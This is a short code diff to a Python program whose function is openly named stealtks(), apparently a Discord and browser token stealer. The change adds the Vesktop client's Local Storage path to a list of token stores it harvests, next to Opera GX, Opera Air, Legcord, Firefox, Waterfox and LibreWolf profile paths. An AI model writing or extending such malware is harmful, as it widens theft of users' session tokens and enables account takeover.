@@ -340,6 +340,7 @@ def stealtks():
     '2OperaGXNew': os.path.join(roaming, 'Opera Software', 'Opera GX Stable', 'Default', 'Local Storage', 'leveldb'),
     '2OperaAir': os.path.join(roaming, 'Opera Software', 'Opera Air Stable', 'Default', 'Local Storage', 'leveldb'),
     '2Legcord': os.path.join(roaming, 'legcord', 'Local Storage', 'leveldb'),
+    '2Vesktop': os.path.join(roaming, 'vesktop', 'sessionData', 'Local Storage', 'leveldb'),
     '3FireFox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
     '3WaterFox': os.path.join(roaming, 'Waterfox', 'Profiles'),
     '3LibreWolf': os.path.join(roaming, 'LibreWolf', 'Profiles'),
@@ -456,3 +457,4 @@ def main():
         
 
 main()
+
